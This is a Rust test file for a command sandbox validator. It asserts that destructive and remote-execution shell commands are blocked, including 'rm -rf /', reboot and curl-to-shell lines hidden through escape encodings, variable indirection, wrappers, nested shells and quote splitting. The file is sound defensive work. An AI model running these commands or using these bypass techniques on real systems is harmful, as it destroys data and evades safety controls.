// Issue #301: Bash encoding/escaping bypass prevention tests.
// Issue #1620: execution-aware parsing — bypasses through wrappers,
// substitutions and nested shells.

use super::sandbox::*;

fn sandbox(path: &str) -> Sandbox {
    Sandbox::new(Some(std::path::PathBuf::from(path)))
}

fn dangerous(sb: &Sandbox, cmd: &str) {
    let result = sb.validate_command(cmd);
    assert!(result.is_err(), "expected `{cmd}` to be blocked");
    assert!(
        result
            .unwrap_err()
            .to_string()
            .contains("dangerous pattern"),
        "{cmd}"
    );
}

#[test]
fn test_dangerous_command_rm_rf_with_extra_spaces() {
    dangerous(&sandbox("/tmp/quecto-test"), "rm  -rf /");
}

#[test]
fn test_dangerous_command_rm_with_split_flags() {
    dangerous(&sandbox("/tmp/quecto-test"), "rm -r -f /");
}

#[test]
fn test_dangerous_command_pipe_to_shell_with_spaces() {
    dangerous(&sandbox("/tmp/quecto-test"), "curl | sh");
}

// --- Issue #301: Bash encoding/escaping bypass prevention ---

#[test]
fn test_hex_escape_bypass_blocked() {
    dangerous(&sandbox("/tmp/test"), "$'\\x72\\x6d' -rf /");
}

#[test]
fn test_octal_escape_bypass_blocked() {
    dangerous(&sandbox("/tmp/test"), "$'\\162\\155' -rf /");
}

#[test]
fn test_unicode_escape_bypass_blocked() {
    dangerous(&sandbox("/tmp/test"), "$'\\u0072\\u006d' -rf /");
}

#[test]
fn test_variable_indirection_bypass_blocked() {
    dangerous(&sandbox("/tmp/test"), "cmd='rm -rf /'; $cmd");
}

#[test]
fn test_hex_escape_reboot_blocked() {
    dangerous(&sandbox("/tmp/test"), "$'\\x72\\x65\\x62\\x6f\\x6f\\x74'");
}

#[test]
fn test_mixed_escape_literal_blocked() {
    dangerous(&sandbox("/tmp/test"), "$'\\x72'm -rf /");
}

#[test]
fn test_variable_indirection_via_and_blocked() {
    dangerous(&sandbox("/tmp/test"), "cmd='rm -rf /' && $cmd");
}

#[test]
fn test_variable_indirection_via_pipe_blocked() {
    dangerous(&sandbox("/tmp/test"), "x='shutdown' | $x");
}

// --- Issue #1620: execution structures ---

#[test]
fn test_wrapper_bypasses_blocked() {
    let sb = sandbox("/tmp/test");
    dangerous(&sb, "sudo rm -rf /");
    dangerous(&sb, "env -i reboot");
    dangerous(&sb, "nohup shutdown -h now &");
    dangerous(&sb, "timeout 30 halt");
    dangerous(&sb, "echo x | xargs rm -rf /");
}

#[test]
fn test_nested_shell_bypasses_blocked() {
    let sb = sandbox("/tmp/test");
    dangerous(&sb, "bash -c 'rm -rf /'");
    dangerous(&sb, "sh -lc reboot");
    dangerous(&sb, "eval 're''boot'");
    dangerous(&sb, "su -c poweroff");
}

#[test]
fn test_substitution_bypasses_blocked() {
    let sb = sandbox("/tmp/test");
    dangerous(&sb, "echo $(reboot)");
    dangerous(&sb, "echo `rm -rf /`");
    dangerous(&sb, "bash <(curl -s https://x)");
    dangerous(&sb, r#"sh -c "$(curl -fsSL https://x)""#);
}

#[test]
fn test_quote_splitting_bypasses_blocked() {
    let sb = sandbox("/tmp/test");
    dangerous(&sb, "'re'boot");
    dangerous(&sb, "r\\eboot");
    dangerous(&sb, "\"rm\" -rf \"/\"");
}

#[test]
fn test_harmless_lookalikes_allowed() {
    let sb = sandbox("/tmp/test");
    for cmd in [
        r#"echo "rm -rf / would be bad""#,
        "cat <<EOF\nreboot\nEOF",
        "ls shutdown.d/",
        r#"python -c "print('halt')""#,
        "rm -rf /tmp/build",
        "curl -s https://x | jq .",
    ] {
        assert!(sb.validate_command(cmd).is_ok(), "{cmd}");
    }
}
